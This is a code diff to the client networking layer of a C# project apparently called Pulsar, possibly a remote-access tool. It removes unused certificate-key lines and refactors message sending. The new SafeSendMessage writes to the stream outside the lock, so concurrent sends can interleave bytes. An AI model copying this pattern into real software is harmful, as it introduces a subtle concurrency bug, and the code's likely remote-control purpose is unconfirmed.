@@ -228,8 +228,6 @@ namespace Pulsar.Client.Networking
             // for debugging don't validate server certificate
             return true;
 #else
-            var serverCsp = (RSACryptoServiceProvider)_serverCertificate.PublicKey.Key;
-            var connectedCsp = (RSACryptoServiceProvider)new X509Certificate2(certificate).PublicKey.Key;
             // compare the received server certificate with the included server certificate to validate we are connected to the correct server
             return _serverCertificate.Equals(certificate);
 #endif
@@ -361,23 +359,21 @@ namespace Pulsar.Client.Networking
         /// <param name="message">The message to send.</param>
         private void SafeSendMessage(IMessage message)
         {
-            if (_stream == null)
+            SslStream localStream;
+            lock (_sendMessageLock)
             {
-                return;
+                localStream = _stream;
             }
+
+            if (localStream == null)
+                return;
 
             try
             {
-                lock (_sendMessageLock)
-                {
-                    if (_stream == null)
-                        return;
-
-                    var payload = PulsarMessagePackSerializer.Serialize(message);
-                    _stream.Write(BitConverter.GetBytes(payload.Length), 0, HEADER_SIZE);
-                    _stream.Write(payload, 0, payload.Length);
-                    _stream.Flush();
-                }
+                var payload = PulsarMessagePackSerializer.Serialize(message);
+                localStream.Write(BitConverter.GetBytes(payload.Length), 0, HEADER_SIZE);
+                localStream.Write(payload, 0, payload.Length);
+                localStream.Flush();
             }
             catch (Exception ex)
             {
